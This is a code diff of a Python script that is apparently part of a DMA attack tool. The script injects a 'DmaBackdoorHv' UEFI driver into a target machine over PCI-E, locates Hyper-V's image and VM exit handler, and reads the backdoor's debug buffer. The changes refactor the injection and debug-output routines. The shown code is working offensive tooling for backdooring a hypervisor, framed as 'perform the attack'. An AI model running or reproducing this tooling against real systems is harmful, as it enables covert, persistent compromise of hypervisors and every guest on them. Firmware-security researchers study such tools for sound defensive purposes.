@@ -23,7 +23,8 @@ BACKDOOR_ERR_HYPER_V_IMAGE  = -5    # Hyper-V image not found
 BACKDOOR_ERR_HYPER_V_EXIT   = -6    # Hyper-V VM exit handler not found
 
 # payload DXE driver
-DRIVER_PATH = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi')
+DRIVER_PATH = os.path.join(os.path.dirname(os.path.realpath(__file__)), \
+              'payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi')
 
 def inject(driver = None, test = False, method = None, system_table = None, prot_entry = None):
 
@@ -103,12 +104,42 @@ def inject(driver = None, test = False, method = None, system_table = None, prot
         print('[+] Hyper-V image was loaded\n')
         print('    Hyper-V image base: 0x%.16x' % image_base)
         print('           Image entry: 0x%.16x' % image_entry)
-        print('       VM exit handler: 0x%.16x\n' % vm_exit)        
-        break
+        print('       VM exit handler: 0x%.16x\n' % vm_exit)
 
-    print('[+] DONE')
+        print('[+] DONE')
 
-    return dev
+        return dev
+
+    # error ocurred
+    dev.close()
+
+    return None
+
+def print_debug_output():
+
+    # open device
+    dev = TransactionLayer()    
+
+    print('[+] PCI-E link with target is up')
+
+    # read debug output address
+    addr = dev.mem_read_8(OUTPUT_ADDR)
+
+    print('[+] Debug output buffer address is 0x%x' % addr)
+
+    # check for the sane address
+    if addr > 0x1000 and addr < 0x100000000 and (addr & 0xfff) == 0:
+
+        # read debug output
+        data = dev.mem_read(addr, OUTPUT_SIZE)
+
+        print('\n' + data.split('\0')[0])
+        return 0
+
+    else:
+
+        print('[!] Invalid address')
+        return -1 
 
 def main():
 
@@ -142,29 +173,8 @@ def main():
 
         if options.debug_output:
 
-            # open device
-            dev = TransactionLayer()    
-
-            print('[+] PCI-E link with target is up')
-
-            # read debug output address
-            addr = dev.mem_read_8(OUTPUT_ADDR)
-
-            print('[+] Debug output buffer address is 0x%x' % addr)
-
-            # check for the sane address
-            if addr > 0x1000 and addr < 0x100000000 and (addr & 0xfff) == 0:
-
-                # read debug output
-                data = dev.mem_read(addr, OUTPUT_SIZE)
-
-                print('\n' + data.split('\0')[0])
-                return 0
-
-            else:
-
-                print('[!] Invalid address')
-                return -1   
+            # read and print debug messages of DXE driver
+            return print_debug_output()
 
         # perform the attack
         dev = inject(driver = options.driver, test = options.test, 
